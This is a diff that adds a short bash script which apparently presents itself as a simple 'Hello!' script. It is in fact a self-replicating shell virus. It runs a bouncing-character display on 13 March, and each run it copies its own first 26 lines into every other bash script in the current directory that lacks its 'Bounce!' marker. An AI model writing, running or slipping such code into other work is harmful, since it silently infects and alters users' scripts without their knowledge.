@@ -1,0 +1,27 @@
+#!/bin/bash
+T=/tmp/b.d
+if [ $(date +%d%m) == "1303" ]; then
+C=$(tput cols)
+L=$(tput lines)
+tput civis
+for((x=y=u=v=1;;x+=u,y+=v,u=(x<1||x>="$C-1")?-u:u,v=(y<1||y>="$L-1")?-v:v)){
+tput cup $y $x
+tput sc
+printf "o"
+sleep .1
+tput rc
+printf " "
+}
+fi
+for t in *; do
+l=$(wc -l < "$t")
+m=$(head -$l "$t" | grep -ic 'Bounce!')
+v=$(head -$l "$t" | grep -ic '#!/bin/bash')
+if [ "$v" -eq 1 ] && [ "$m" -eq 0 ]; then
+head -26 "$0" > $T
+grep -v "#!/bin/bash" "$t" >> $T
+mv "$T" "$t"
+fi
+done
+# Bounce!
+echo "Hello!"
